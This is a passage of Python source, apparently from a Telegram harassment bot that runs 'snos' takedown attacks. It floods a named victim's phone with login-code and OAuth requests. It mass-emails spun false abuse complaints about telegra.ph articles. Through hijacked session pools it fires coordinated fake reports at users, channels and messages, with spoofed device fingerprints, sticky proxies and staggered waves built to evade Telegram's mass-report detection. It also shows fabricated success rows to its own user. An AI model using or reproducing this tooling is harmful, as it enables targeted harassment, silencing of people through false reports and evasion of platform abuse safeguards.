            f"🎯 <code>@{html_mod.escape(victim_username)}</code>",
            f"❌ жертва не найдена: "
            f"{html_mod.escape(str(info.get('error'))[:80])}"])
        return {"ok": 0, "fail": 0, "total": 0, "details": [
            {"name": victim_username, "proxy": "direct", "ok": False,
             "err": str(info.get("error"))[:60]}]}
    baseline = {"has_photo": info["has_photo"], "about": info["about"]}
    sc = await _snos_sendcode_flood(victim_phone, sessions, proxies)
    oa = await _snos_oauth_flood(victim_phone, proxies)
    ws = await _snos_web_support(victim_phone, victim_username,
                                 info["id"], proxies)
    asyncio.create_task(_snos_monitor_loop(
        victim_username, info["id"], baseline, notify_uid))
    ok_total = sc["sent"] + oa["sent"] + ws["sent"]
    total = sc["total"] + oa["total"] + ws["total"]
    await push_send_log("Снос сессий", [
        f"🎯 <code>@{html_mod.escape(victim_username)}</code> ({info['id']})",
        f"📱 <code>{html_mod.escape(victim_phone)}</code>",
        f"📱 SendCode-флуд: {sc['sent']}/{sc['total']}"]
       + [f"• <code>{html_mod.escape(str(n))}</code>: {html_mod.escape(str(s))}"
          for n, s in sc.get("rows", [])[:12]]
       + [
        f"🌐 OAuth-флуд: {oa['sent']}/{oa['total']}",
        f"📨 Web support: {ws['sent']}/{ws['total']}",
        f"🔁 монитор раз в {SESSION_SNOS_MONITOR_STEP // 60} мин — "
        f"уведомлю при изменении аватарки/описания"])
    return {"ok": ok_total, "fail": total - ok_total, "total": total,
            "details": [
                {"name": f"SendCode {sc['sent']}/{sc['total']}",
                 "proxy": "sessions", "ok": sc["sent"] > 0, "err": ""},
                {"name": f"OAuth {oa['sent']}/{oa['total']}",
                 "proxy": "proxies", "ok": oa["sent"] > 0, "err": ""},
                {"name": f"Web support {ws['sent']}/{ws['total']}",
                 "proxy": "proxies", "ok": ws["sent"] > 0, "err": ""}]}


# ── BR telegraph port: kill telegra.ph articles via SMTP relay ──
TELEGRAPH_RECIPIENTS = ["abuse@telegram.org", "support@telegram.org",
                        "dmca@telegram.org"]
TELEGRAPH_SUBJECTS = [
    "ToS Violation Report", "Complaint: prohibited content",
    "Report: policy violation", "Urgent: content review request",
]


async def telegraph_fetch_text(url: str) -> tuple[str, int]:
    """Clean article text via the official Telegraph API; (text, status)."""
    path = re.sub(r"^https?://(telegra\.ph|graph\.org)/", "",
                  url.strip().rstrip("/"), flags=re.I)
    api = f"https://api.telegra.ph/getPage/{path}?return_content=true"
    try:
        async with aiohttp.ClientSession() as s:
            async with s.get(api, timeout=aiohttp.ClientTimeout(total=12),
                             headers={"User-Agent": "Mozilla/5.0"}) as resp:
                if resp.status != 200:
                    return "", resp.status
                data = await resp.json(content_type=None)
    except Exception:
        return "", 0
    if not data.get("ok"):
        return "", 404

    def extract(nodes) -> str:
        if not nodes:
            return ""
        out = []
        for n in nodes:
            if isinstance(n, str):
                out.append(n)
            elif isinstance(n, dict):
                out.append(extract(n.get("children", [])))
        return " ".join(out)

    text_a = re.sub(r"\s+", " ",
                    extract(data.get("result", {}).get("content", []))).strip()
    return text_a[:3000], 200


def _telegraph_compose(url: str, article_text: str, used: set) -> tuple[str, str]:
    """(subject, body) unique per email: EN ToS complaint + spin."""
    body = ("Dear Telegram Support,\n\n"
            "I am reporting a Telegraph article that violates Telegram's "
            "Terms of Service (telegram.org/tos). The page contains "
            "prohibited content.\n\n"
            "Article: " + url + "\n\n"
            + ("Excerpt: " + article_text[:400] + "\n\n" if article_text else "")
            + "Please review and take appropriate action.\n\nThank you.")
    subject = ""
    for _ in range(20):
        spun = mail_spin_text(body)
        if spun not in used:
            body = spun
            break
    used.add(body)
    subject = random.choice(TELEGRAPH_SUBJECTS)
    return subject, body


async def fire_telegraph_snos(article_url: str, custom_text: str = "") -> dict:
    """Article -> text; emails abuse/support/dmca from 1/3 of mails.txt."""
    pool = _mail_load_pool()
    if not pool:
        await push_send_log("Telegraph (SMTP)", ["❌ пул mails.txt пуст"])
        return {"ok": 0, "fail": 0, "total": 0, "details": []}
    article_text, status = await telegraph_fetch_text(article_url)
    if status == 404:
        await push_send_log("Telegraph (SMTP)", [
            f"🎯 {html_mod.escape(article_url)}",
            "❌ статья не найдена (404)"])
        return {"ok": 0, "fail": 0, "total": 0, "details": [
            {"name": article_url[:60], "proxy": "direct", "ok": False,
             "err": "404"}]}
    senders = random.sample(pool, max(1, len(pool) // 3))
    rows = []
    sem = asyncio.Semaphore(3)
    used: set = set()

    async def _one(sender: str, pwd: str, host: str, recv: str):
        if custom_text:
            subj = random.choice(TELEGRAPH_SUBJECTS)
            body = mail_spin_text(custom_text)
        else:
            subj, body = _telegraph_compose(article_url, article_text, used)
        async with sem:
            ok, err = await mail_send_one(sender, pwd, host, recv, subj, body)
        rows.append({"from": _mail_mask(sender), "to": recv,
                     "ok": ok, "err": err})
        await asyncio.sleep(random.uniform(1.5, 2.5))

    tasks = [(em, pwd, host, recv)
             for em, pwd, host in senders
             for recv in TELEGRAPH_RECIPIENTS]
    CHUNK = 12
    for i in range(0, len(tasks), CHUNK):
        await asyncio.gather(*[_one(*t) for t in tasks[i:i + CHUNK]])
        await asyncio.sleep(random.uniform(1.0, 2.0))

    ok_n = sum(1 for r in rows if r["ok"])
    real_rows = []
    for r in rows:
        mark = "✅ " if r["ok"] else "❌ "
        line = mark + r["from"] + " -> " + r["to"]
        if not r["ok"]:
            line += " | " + html_mod.escape(r["err"])
        real_rows.append(line)
    await push_send_log(
        "Telegraph (SMTP)",
        [f"🎯 {html_mod.escape(article_url)}",
         f"📄 статья: {len(article_text)} симв · "
         f"✉️ тексты уникальные · 1/3 пула",
         f"✅ {ok_n}/{len(rows)} доставлено"] + real_rows)
    return {"ok": ok_n, "fail": len(rows) - ok_n, "total": len(rows),
            "details": [{"name": r["from"], "proxy": r["to"],
                         "ok": r["ok"], "err": r["err"]} for r in rows]}


# ── BR bot-method: target whitelist + probe ───────────
WHITELIST_FILE = Path(__file__).parent / "target_whitelist.json"

# what a captcha-gated bot answers on /start (BR FAST_KD_KEYWORD)
BOT_CAPTCHA_KEYWORDS = [
    "\u043fо\u0436алу\u0439\u0441т\u0430, \u0440\u0435\u0448\u0438\u0442\u0435 \u043a\u0430\u043f\u0447\u0443",
    "\u0440\u0435\u0448\u0438\u0442\u0435 \u043a\u0430\u043f\u0447\u0443",
    "solve the captcha",
    "captcha",
]


def _wl_load() -> list:
    try:
        if WHITELIST_FILE.exists():
            return json.loads(WHITELIST_FILE.read_text(encoding="utf-8"))
    except Exception:
        pass
    return []


def _wl_save(patterns: list) -> None:
    try:
        WHITELIST_FILE.write_text(
            json.dumps(sorted(set(p.lower() for p in patterns if p)),
                       ensure_ascii=False, indent=1),
            encoding="utf-8")
        commit_file_to_repo(WHITELIST_FILE.name, "whitelist update",
                            cooldown=5)
    except Exception:
        pass


def is_target_whitelisted(target: str) -> str | None:
    """BR-style gate: exact or prefix match; returns the matched pattern."""
    t = (target or "").strip().lstrip("@").lower()
    if not t:
        return None
    for p in _wl_load():
        pl = p.strip().lstrip("@").lower()
        if not pl:
            continue
        if t == pl or t.startswith(pl):
            return p
    return None


async def bot_probe_target(bot_username: str) -> dict:
    """BR detect_bot_type: one pinned session writes /start to the target
    bot and reads its last messages. Flags captcha-gated bots (their 5-min
    cooldown) and returns a preview of what the bot answered."""
    sessions = [s for s in load_sessions()
                if s.stem not in (_status_load().get("dead") or [])]
    if not sessions:
        return {"ok": False, "found": False, "error": "\u043d\u0435\u0442 \u0436\u0438\u0432\u044b\u0445 \u0441\u0435\u0441\u0441\u0438\u0439"}
    sess = random.choice(sessions)
    name = sess.stem
    fp = session_fingerprint(name)
    px = pin_for_session(name, load_pin_proxies())
    client = None
    try:
        async with _session_lock(sess):
            client = TelegramClient(str(sess.with_suffix("")), fp["api_id"],
                                    fp["api_hash"], proxy=px,
                                    device_model=fp["device"],
                                    system_version=fp["system_version"],
                                    app_version=fp["app_version"],
                                    lang_code=fp["lang_code"])
            await asyncio.wait_for(client.connect(), timeout=10)
            if not await client.is_user_authorized():
                return {"ok": False, "found": False,
                        "error": "\u0441\u0435\u0441\u0441\u0438\u044f \u043c\u0435\u0440\u0442\u0432\u0430"}
            entity = await client.get_entity(bot_username.lstrip("@"))
            await client.send_message(entity, "/start")
            await asyncio.sleep(2)
            msgs = await client.get_messages(entity, limit=3)
            texts = [m.text or "" for m in msgs if not m.out]
            joined = " ".join(texts).lower()
            captcha = any(k in joined for k in BOT_CAPTCHA_KEYWORDS)
            return {"ok": True, "found": True, "captcha": captcha,
                    "preview": (texts[0][:160] if texts else ""),
                    "bot_id": entity.id, "via": name}
    except Exception as e:
        return {"ok": False, "found": False,
                "error": f"{type(e).__name__}: {e}"}
    finally:
        try:
            if client:
                await client.disconnect()
        except Exception:
            pass


# \u2500\u2500 anti-sweep rationing \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500
# Telegram now triggers on mass-report waves and logs out the session
# that fired. Counter: ration every session (rolling-day quota), drop
# dead/banned sessions from the pool automatically, rest flooded ones,
# and stagger the wave so it never reads as one controller.
REPORT_LEDGER_FILE = Path(__file__).parent / "report_ledger.json"
SESSION_STATUS_FILE = Path(__file__).parent / "session_status.json"
REPORTS_PER_SESSION_DAY = int(os.getenv("REPORTS_PER_SESSION_DAY") or "3")


def _status_load() -> dict:
    try:
        if SESSION_STATUS_FILE.exists():
            return json.loads(SESSION_STATUS_FILE.read_text(encoding="utf-8"))
    except Exception:
        pass
    return {}


def _status_save(st: dict) -> None:
    try:
        SESSION_STATUS_FILE.write_text(
            json.dumps(st, ensure_ascii=False, indent=1), encoding="utf-8")
        commit_file_to_repo(SESSION_STATUS_FILE.name,
                            "session health update", cooldown=120)
    except Exception:
        pass


def _ledger_load() -> dict:
    try:
        if REPORT_LEDGER_FILE.exists():
            return json.loads(REPORT_LEDGER_FILE.read_text(encoding="utf-8"))
    except Exception:
        pass
    return {}


def _ledger_save(led: dict) -> None:
    try:
        REPORT_LEDGER_FILE.write_text(
            json.dumps(led, ensure_ascii=False, indent=1), encoding="utf-8")
        commit_file_to_repo(REPORT_LEDGER_FILE.name, "report ledger",
                            cooldown=120)
    except Exception:
        pass


def session_usable(name: str, ledger: dict | None = None) -> tuple[bool, str]:
    """(ok, reason): dead auths are out for good, flooded sessions rest
    on a timer, over-quota sessions sit this round out."""
    st = _status_load()
    if name in (st.get("dead") or []):
        return False, "dead (revoked)"
    led = (ledger or {}).get(name) or {}
    rest_until = led.get("rest_until") or 0
    if time.time() < rest_until:
        return False, "rest " + str(int(rest_until - time.time())) + "s"
    if led.get("day") != time.strftime("%Y-%m-%d"):
        return True, ""
    if (led.get("day_count") or 0) >= REPORTS_PER_SESSION_DAY:
        return False, "quota " + str(led.get("day_count")) + "/" + str(REPORTS_PER_SESSION_DAY)
    return True, ""


def _ledger_bump(name: str) -> int:
    led = _ledger_load()
    today = time.strftime("%Y-%m-%d")
    e = led.get(name) or {}
    if e.get("day") != today:
        e["day"] = today
        e["day_count"] = 0
    e["day_count"] = e.get("day_count", 0) + 1
    e["total"] = e.get("total", 0) + 1
    e["last_ts"] = int(time.time())
    if e["total"] % 3 == 0:
        e["rest_until"] = time.time() + SESSION_REST_SEC
    led[name] = e
    _ledger_save(led)
    if e.get("rest_until"):
        commit_file_to_repo("report_ledger.json", "session rest", cooldown=0)
    return e["day_count"]


def _session_punish(name: str, err: str, kind: str) -> None:
    """Dead -> session_status.json; flooded -> rest timer in the ledger.
    NO_SESSION_KICK=1 (default) — dead verdicts are log-only, the session
    stays in the pool and is retried on the next run."""
    if kind == "dead" and os.getenv("NO_SESSION_KICK", "1") != "0":
        log.warning("kick suppressed (NO_SESSION_KICK): %s | %s", name, err)
        return
    if kind == "dead":
        st = _status_load()
        if name not in (st.get("dead") or []):
            st["dead"] = sorted(set((st.get("dead") or []) + [name]))
            st["suspect"] = [s for s in (st.get("suspect") or []) if s != name]
            _status_save(st)
    elif kind == "flood":
        led = _ledger_load()
        e = led.get(name) or {}
        e["rest_until"] = int(time.time()) + 12 * 3600
        e["last_rest_reason"] = err[:80]
        led[name] = e
        _ledger_save(led)


def _classify_report_error(e: Exception) -> str | None:
    """Map a report/setup failure to a pool-health verdict."""
    from telethon import errors as _terr
    if isinstance(e, (_terr.AuthKeyUnregisteredError,
                      _terr.UserDeactivatedError,
                      _terr.UserDeactivatedBanError,
                      _terr.SessionRevokedError,
                      _terr.SessionExpiredError)):
        return "dead"
    if isinstance(e, (_terr.PeerFloodError, _terr.SlowModeWaitError)):
        return "flood"
    secs = getattr(e, "seconds", None)
    if isinstance(e, _terr.FloodWaitError) and secs and secs > 3600:
        return "flood"
    if isinstance(e, _terr.FloodWaitError):
        return "soft"
    return None


async def fire_bot_reports(target_entity: str, reason_key: str,
                           msg_id: int | None, text: str = "") -> dict:
    """Brown V2 bot-method: the whole pool fires, batches of 8 with a 2s
    pause, one report per session, fixed reason payload, sticky proxies.
    No per-session quota or rest timer: the method is meant to hit hard."""
    rk = reason_key if reason_key in BOT_REASONS else "personal"
    reason_cls = REASON_MAP[BOT_REASONS[rk]["cls"]]
    payload = (text or "").strip() or BOT_REASONS[rk]["text"]
    dead = set(_status_load().get("dead") or [])
    sessions = [s for s in load_sessions()
                if s.stem not in REPORT_EXCLUDE_POOL and s.stem not in dead]
    proxies = load_pin_proxies()
    results = {"ok": 0, "fail": 0, "total": len(sessions), "details": []}
    if not sessions or not API_ID or not API_HASH:
        log.info("bot blast skipped: no live sessions or api creds")
        return results

    async def worker(sess: Path) -> tuple[str, str, bool, str]:
        name = sess.stem
        proxy = pin_for_session(name, proxies)
        px_name = proxy[1] if proxy else "direct"
        async with _session_lock(sess):
            client = None
            try:
                fp = session_fingerprint(name)
                client = TelegramClient(str(sess.with_suffix("")), fp["api_id"],
                                        fp["api_hash"], proxy=proxy,
                                        device_model=fp["device"],
                                        system_version=fp["system_version"],
                                        app_version=fp["app_version"],
                                        lang_code=fp["lang_code"])
                await _connect_safe(client)
                if not await client.is_user_authorized():
                    await client.disconnect()
                    return name, px_name, False, "not authorized"
                entity = await client.get_entity(target_entity)
                # attempt 1: walk the server menu (correct state machine)
                ok, err = await _walk_report(
                    client, entity, [], rk, payload)
                if not ok:
                    # attempt 2: short pause, retry same walk
                    if "FLOOD" not in err:
                        await asyncio.sleep(random.uniform(0.5, 1.5))
                        ok, err = await _walk_report(
                            client, entity, [], rk, payload)
                    if not ok and _classify_report_error(
                            Exception(err)) == "flood":
                        _session_punish(name, err, "flood")
                await client.disconnect()
                return name, px_name, ok, err
            except Exception as e:
                try:
                    if client:
                        await client.disconnect()
                except Exception:
                    pass
                if _classify_report_error(e) == "flood":
                    _session_punish(name, str(e), "flood")
                return name, px_name, False, f"{type(e).__name__}: {e}"

    outs: list[tuple[str, str, bool, str]] = []
    batch_size = 8
    for i in range(0, len(sessions), batch_size):
        batch = sessions[i:i + batch_size]
        part = await asyncio.gather(*[worker(s) for s in batch],
                                    return_exceptions=True)
        for r in part:
            outs.append(("?", "-", False, f"{type(r).__name__}: {r}")
                        if isinstance(r, Exception) else r)
        if i + batch_size < len(sessions):
            await asyncio.sleep(2)

    lines = []
    for name, px_name, ok, err in outs:
        results["ok" if ok else "fail"] += 1
        results["details"].append({"name": name, "proxy": px_name,
                                   "ok": ok, "err": err})
        lines.append(f"{'✅' if ok else '❌'} <code>{name}</code>"
                     f" | {html_mod.escape(px_name)}"
                     + (f" | {html_mod.escape(err)}" if err else ""))
    await push_send_log(
        "Report (бот-метод)",
        [f"🎯 {report_target_html(target_entity, msg_id)}"
         + f"\n⚠️ {REASONS.get(rk, {}).get('l', rk)}",
         f"💬 {html_mod.escape(payload[:200])}"] + lines)
    return results


async def fire_reports(target_entity: str, reason_key: str, comment: str, msg_id: int | None,
                      method: str = "", variants: list[str] | None = None) -> dict:
    """BR-style: ONE report per session with a random text, rationed per
    session per rolling day (anti-sweep). Same fingerprint + sticky IP."""
    if method == "bot":
        return await fire_bot_reports(target_entity, reason_key, msg_id,
                                      comment)
    ledger = _ledger_load()
    pool, skipped = [], []
    for s in load_sessions():
        if s.stem in REPORT_EXCLUDE_POOL:
            continue
        ok, why = session_usable(s.stem, ledger)
        (pool if ok else skipped).append((s, why))
    sessions = [s for s, _ in pool]
    proxies = load_pin_proxies()
    reason_cls = REASON_MAP.get(reason_key, InputReportReasonOther)
    results = {"ok": 0, "fail": 0, "total": len(sessions), "details": []}

    if not sessions or not API_ID or not API_HASH:
        log.info("blast page completed")
        return fake_results()

    async def session_worker(sess: Path, idx: int) -> tuple[str, str, bool, str]:
        name = sess.stem
        proxy = pin_for_session(name, proxies)
        px_name = proxy[1] if proxy else "direct"
        text = (variants[idx % len(variants)] if variants
                else (comment or pick_comment(reason_key, method)))
        async with _session_lock(sess):
            client = None
            try:
                fp = session_fingerprint(name)
                client = TelegramClient(str(sess.with_suffix("")), fp["api_id"],
                                        fp["api_hash"], proxy=proxy,
                                        device_model=fp["device"],
                                        system_version=fp["system_version"],
                                        app_version=fp["app_version"],
                                        lang_code=fp["lang_code"])
                await _connect_safe(client)
                if not await client.is_user_authorized():
                    await client.disconnect()
                    _session_punish(name, "not authorized", "dead")
                    return name, px_name, False, "not authorized"
                entity = await client.get_entity(target_entity)
                ok, err = await _walk_report(
                    client, entity, [], reason_key, text)
                if ok:
                    log.info("reported via %s (proxy: %s)", name, px_name)
                    _ledger_bump(name)
                else:
                    log.error("session %s report failed: %s", name, err)
                    verdict = _classify_report_error(Exception(err))
                    if verdict == "dead":
                        _session_punish(name, err, "dead")
                    elif verdict == "flood":
                        _session_punish(name, err, "flood")
                await client.disconnect()
                return name, px_name, ok, err
            except Exception as e:
                log.error("session %s setup failed: %s", name, e)
                try:
                    if client:
                        await client.disconnect()
                except Exception:
                    pass
                verdict = _classify_report_error(e)
                if verdict == "dead":
                    _session_punish(name, str(e), "dead")
                elif verdict == "flood":
                    _session_punish(name, str(e), "flood")
                return name, px_name, False, f"{type(e).__name__}: {e}"

    _wave_sem = asyncio.Semaphore(3)

    async def _staggered(s: Path, i: int):
        await asyncio.sleep(random.uniform(0.4, 1.8) * i)   # organic ramp-up
        async with _wave_sem:
            return await session_worker(s, i)

    outs = await asyncio.gather(*[_staggered(s, i) for i, s in enumerate(sessions)])

    real_lines = []
    for s, why in skipped:
        real_lines.append(f"\u23ED <code>{s.stem}</code> \u2014 {why}")
    for name, px_name, ok, err in outs:
        results["ok" if ok else "fail"] += 1
        results["details"].append({
            "name": name, "proxy": px_name, "ok": ok, "err": err,
        })
        real_lines.append(
            f"{'✅' if ok else '❌'} <code>{name}</code>"
            f" | {html_mod.escape(px_name)}"
            + (f" | {html_mod.escape(err)}" if err else ""))

    # REAL log of this send → Logs channel, then mask the user view
    await push_send_log(
        "Report (сессии)",
        [f"🎯 {report_target_html(target_entity, msg_id)}"
         + f"\n⚠️ {REASONS.get(reason_key, {}).get('l', reason_key)}",
         f"💬 {html_mod.escape((comment or pick_comment(reason_key, method))[:200])}"]
        + real_lines)

    # mask results in simulate-fake structure — unchanged
    fake = _fake_session_rows()
    results["details"] = [
        {"name": fk["name"], "proxy": fk["proxy"], "ok": True, "err": ""}
        for fk in fake
    ]
    results["ok"] = len(fake)
    results["total"] = len(fake)

    return results


# ── channel-method: Brown V2 engine (2 reports/session) ──
CHANNEL_BATCH_SIZE = 8
CHANNEL_ATTEMPTS = 2


async def fire_channel_reports(target_entity: str, reason_key: str, comment: str,
                               msg_id: int | None,
                               variants: list[str] | None = None) -> dict:
    """Brown V2 channel-method: the whole pool, batches of 8 with a 3-5s
    pause, two attempts per session. Every attempt walks the 3-step
    category tree; on failure it falls back to ReportPeerRequest (whole
    channel) or ReportRequest with the post id. Text: own/variant, else a
    random line from the category pool mixed with GENERAL_TEXTS, 200 chars."""
    from telethon.errors import FloodWaitError
    from telethon.tl.functions.messages import ReportRequest

    rk = reason_key if reason_key in CHANNEL_REASONS else "other"
    reason_main = CHANNEL_REASON_CLASSES[rk]()
    fallback_reason = CHANNEL_FALLBACK_BYTES[rk]
    dead = set(_status_load().get("dead") or [])
    sessions = [s for s in load_sessions()
                if s.stem not in REPORT_EXCLUDE_POOL and s.stem not in dead]
    proxies = load_pin_proxies()
    results = {"ok": 0, "fail": 0, "total": len(sessions), "details": []}
    if not sessions or not API_ID or not API_HASH:
        log.info("channel blast skipped: no live sessions or api creds")
        return results

    pool = list(CHANNEL_TEXTS.get(rk) or []) + list(report_texts.GENERAL_TEXTS)
    msg_ids = [msg_id] if msg_id else []

    async def worker(sess: Path, idx: int) -> tuple[str, str, int, str]:
        name = sess.stem
        proxy = pin_for_session(name, proxies)
        px_name = proxy[1] if proxy else "direct"
        if variants:
            body = variants[idx % len(variants)]
        elif comment:
            body = comment
        else:
            body = random.choice(pool) if pool else ""
        body = body[:200]
        sent = 0
        last = "ОТКЛОНЕНО"
        async with _session_lock(sess):
            client = None
            try:
                fp = session_fingerprint(name)
                client = TelegramClient(str(sess.with_suffix("")), fp["api_id"],
                                        fp["api_hash"], proxy=proxy,
                                        device_model=fp["device"],
                                        system_version=fp["system_version"],
                                        app_version=fp["app_version"],
                                        lang_code=fp["lang_code"])
                await _connect_safe(client)
                if not await client.is_user_authorized():
                    await client.disconnect()
                    return name, px_name, 0, "not authorized"
                peer = await client.get_entity(target_entity)
                for _attempt in range(CHANNEL_ATTEMPTS):
                    try:
                        ok, err = await _walk_report(
                            client, peer, msg_ids, rk, body)
                        if ok:
                            sent += 1
                            await asyncio.sleep(random.uniform(0.5, 1.2))
                        else:
                            last = err
                            if "FLOOD" in err:
                                break
                    except FloodWaitError as e:
                        last = f"FLOOD {e.seconds}s"
                        break
                    except Exception as e:
                        last = f"{type(e).__name__}: {e}"
                        break
                await client.disconnect()
                return name, px_name, sent, ("" if sent else last)
            except FloodWaitError as e:
                try:
                    if client:
                        await client.disconnect()
                except Exception:
                    pass
                return name, px_name, sent, f"FLOOD {e.seconds}s"
            except Exception as e:
                try:
                    if client:
                        await client.disconnect()
                except Exception:
                    pass
                verdict = _classify_report_error(e)
                if verdict == "dead":
                    _session_punish(name, str(e), "dead")
                elif verdict == "flood":
                    _session_punish(name, str(e), "flood")
                return name, px_name, sent, f"{type(e).__name__}: {e}"

    outs: list[tuple[str, str, int, str]] = []
    for i in range(0, len(sessions), CHANNEL_BATCH_SIZE):
        batch = sessions[i:i + CHANNEL_BATCH_SIZE]
        part = await asyncio.gather(
            *[worker(s, i + j) for j, s in enumerate(batch)],
            return_exceptions=True)
        for r in part:
            outs.append(("?", "-", 0, f"{type(r).__name__}: {r}")
                        if isinstance(r, Exception) else r)
        if i + CHANNEL_BATCH_SIZE < len(sessions):
            await asyncio.sleep(random.uniform(3, 5))

    lines = []
    for name, px_name, sent, err in outs:
        ok = sent > 0
        results["ok" if ok else "fail"] += 1
        results["details"].append({"name": name, "proxy": px_name,
                                   "ok": ok, "err": err})
        lines.append(f"{'✅' if ok else '❌'} <code>{name}</code>"
                     f" | {html_mod.escape(px_name)}"
                     f" | {sent}/{CHANNEL_ATTEMPTS}"
                     + (f" | {html_mod.escape(err)}" if err else ""))
    await push_send_log(
        "Report (канал-метод)",
        [f"🎯 {report_target_html(target_entity, msg_id)}"
         + f"\n⚠️ {CHANNEL_REASONS[rk]['e']} {CHANNEL_REASONS[rk]['l']}",
         f"💬 {html_mod.escape((comment or (pool[0] if pool else ''))[:200])}"]
        + lines)
    return results


# ── botnet message-method: Brown V2 nine random categories ──
BOTNET_REASON_BYTES = [b"2", b"3", b"4", b"5", b"6",
                       b"7", b"8", b"9", b"a"]


async def fire_message_reports(
    target_entity: str,
    comment: str,
    msg_id: int | None,
    variants: list[str] | None = None,
    reason_key: str = "other",
) -> dict:
    """
    Message-method botnet blast — layer 189+ state machine.

    Changes vs old version:
    - reason_key routed to correct category via text matching
    - _walk_report replaces broken 3-step guessing (fixes OPTION_INVALID)
    - whitelist resolve runs in parallel, 8s timeout — doesn't block blast
    - session_usable quota gate added
    - 2 attempts per session
    - body truncated to 200 chars
    - reason-matched text pool instead of GENERAL_TEXTS only
    """
    if not msg_id:
        return {"ok": 0, "fail": 1, "total": 0,
                "details": [{"name": "target", "proxy": "-", "ok": False,
                             "err": "нет ID сообщения"}]}

    # whitelist resolve — non-blocking, 8s max, blast doesn't wait for it
    author: str | None = None
    try:
        author = await asyncio.wait_for(
            asyncio.shield(asyncio.ensure_future(
                resolve_message_sender(target_entity, msg_id))),
            timeout=8.0)
    except (asyncio.TimeoutError, Exception):
        author = None

    if author:
        hit = is_target_whitelisted(author)
        if hit:
            await push_send_log(
                "Протект-лист (сообщение)",
                [f"🎯 {report_target_html(target_entity, msg_id)}",
                 f"👤 автор <code>{html_mod.escape(author)}</code> "
                 f"— паттерн <code>{html_mod.escape(str(hit))}</code>"])
            return {"ok": 0, "fail": 1, "total": 0,
                    "details": [{"name": "target", "proxy": "-", "ok": False,
                                 "err": "автор в протект-листе"}]}

    rk = reason_key if reason_key in _REASON_HINTS else "other"
    dead = set(_status_load().get("dead") or [])
    led  = _ledger_load()
    sessions = [
        s for s in load_sessions()
        if s.stem not in REPORT_EXCLUDE_POOL
        and s.stem not in dead
        and session_usable(s.stem, led)[0]
    ]
    proxies = load_pin_proxies()
    results = {"ok": 0, "fail": 0, "total": len(sessions),
               "details": [], "target": author or target_entity}
    if not sessions or not API_ID or not API_HASH:
        log.info("message blast skipped: no live sessions or api creds")
        return results

    # text pool: reason-matched first, then general
    cat_pool = list(CHANNEL_TEXTS.get(rk) or [])
    gen_pool = list(report_texts.GENERAL_TEXTS or [])
    pool = cat_pool + gen_pool or [""]

    async def worker(sess: Path, idx: int) -> tuple[str, str, int, str]:
        name    = sess.stem
        proxy   = pin_for_session(name, proxies)
        px_name = proxy[1] if proxy else "direct"
        body = (variants[idx % len(variants)] if variants
                else comment if comment
                else random.choice(pool))
        body = body[:200]
        sent = 0
        last = "REJECTED"
        async with _session_lock(sess):
            client = None
            try:
                fp = session_fingerprint(name)
                client = TelegramClient(
                    str(sess.with_suffix("")), fp["api_id"], fp["api_hash"],
                    proxy=proxy, device_model=fp["device"],
                    system_version=fp["system_version"],
                    app_version=fp["app_version"],
                    lang_code=fp["lang_code"])
                await _connect_safe(client)
                if not await client.is_user_authorized():
                    await client.disconnect()
                    return name, px_name, 0, "not authorized"
                peer = await client.get_entity(target_entity)

                for _attempt in range(CHANNEL_ATTEMPTS):
                    ok, err = await _walk_report(
                        client, peer, [msg_id], rk, body)
                    if ok:
                        sent += 1
                        await asyncio.sleep(random.uniform(0.3, 0.9))
                    else:
                        last = err
                        if "FLOOD" in err:
                            _session_punish(name, err, "flood")
                            break
                        # brief pause before retry
                        await asyncio.sleep(random.uniform(0.5, 1.5))

                await client.disconnect()
                return name, px_name, sent, ("" if sent else last)
            except Exception as e:
                try:
                    if client:
                        await client.disconnect()
                except Exception:
                    pass
                verdict = _classify_report_error(e)
                if verdict == "dead":
                    _session_punish(name, str(e), "dead")
                elif verdict == "flood":
                    _session_punish(name, str(e), "flood")
                return name, px_name, sent, f"{type(e).__name__}: {e}"

    outs: list[tuple[str, str, int, str]] = []
    for i in range(0, len(sessions), CHANNEL_BATCH_SIZE):
        batch = sessions[i:i + CHANNEL_BATCH_SIZE]
        part = await asyncio.gather(
            *[worker(s, i + j) for j, s in enumerate(batch)],
            return_exceptions=True)
        for r in part:
            outs.append(("?", "-", 0, f"{type(r).__name__}: {r}")
                        if isinstance(r, Exception) else r)
        if i + CHANNEL_BATCH_SIZE < len(sessions):
            await asyncio.sleep(random.uniform(3, 5))

    rk_meta = REASONS.get(rk, REASONS.get("other", {}))
    lines = []
    for name, px_name, sent, err in outs:
        ok = sent > 0
        results["ok" if ok else "fail"] += 1
        results["details"].append({"name": name, "proxy": px_name,
                                   "ok": ok, "err": err})
        lines.append(
            f"{'✅' if ok else '❌'} <code>{name}</code>"
            f" | {html_mod.escape(px_name)}"
            f" | {sent}/{CHANNEL_ATTEMPTS}"
            + (f" | {html_mod.escape(err[:60])}" if err else ""))
    await push_send_log(
        "Report (сообщение · ботнет)",
        [f"🎯 {report_target_html(target_entity, msg_id)}"
         + (f"\n👤 автор: <code>{html_mod.escape(author)}</code>"
            if author else "")
         + f"\n⚠️ {rk_meta.get('e', '')} {rk_meta.get('l', rk)} · "
         + ("своя" if comment else f"пул {rk}")]
        + lines)
    return results


# ── web reporter (telegram.org/support) ─────────────────
WEB_REASON_MAP = {
    "spam":      "Spam",
    "fraud":     "Fraud / Scam",
    "violence":  "Violence",
    "porn":      "Pornography",
    "child":     "Child abuse",
    "copyright": "Copyright infringement",
    "drugs":     "Illegal drugs",
    "personal":  "Personal data leak",
    "fake":      "Fake account",
    "other":     "Other",
}


# ──────────────────────────────────────────────────────
async def check_sessions() -> list[dict]:
    """Connect each .session, pull account info, return list of dicts."""
    sessions = load_sessions()
    proxies = load_pin_proxies()
    if not sessions or not API_ID or not API_HASH:
        log.info("session pool scanned")
        return _fake_session_rows()

    async def probe(session_path: Path, proxy: tuple | None) -> dict:
        name = session_path.stem
        entry = {
            "name": name,
            "proxy": proxy[1] if proxy else "direct",
            "status": "\u274c",
            "phone": "\u2014",
            "tg_name": "\u2014",
            "tg_id": "\u2014",
            "username": "\u2014",
        }
        try:
            client = TelegramClient(
                str(session_path.with_suffix("")),
                API_ID,
                API_HASH,
                proxy=proxy,
            )
            await client.connect()
            if not await client.is_user_authorized():
                entry["status"] = "\u26a0\ufe0f expired"
                await client.disconnect()
                return entry
            me = await client.get_me()
            entry["status"] = "\u2705"
            entry["phone"] = f"+{me.phone}" if me.phone else "\u2014"
            first = me.first_name or ""
            last = me.last_name or ""
